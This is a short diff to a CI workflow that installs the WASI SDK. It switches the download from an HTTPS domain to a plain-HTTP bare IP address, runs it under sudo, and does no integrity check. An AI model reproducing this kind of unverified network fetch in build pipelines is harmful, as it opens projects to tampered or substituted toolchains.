@@ -30,8 +30,9 @@ jobs:
     - name: Install WASI SDK
       run: |
         cd /opt
-        sudo wget https://asplos.dev/wasi/wasi-sdk-20.0-linux.tar.gz
+        sudo wget http://108.181.27.85/wasi/wasi-sdk-21.0-linux.tar.gz
         sudo tar -xzf wasi-sdk-*.tar.gz
+        mv wasi-sdk-21 wasi-sdk
         
     - name: Make WASI Socket Ext
       run: |
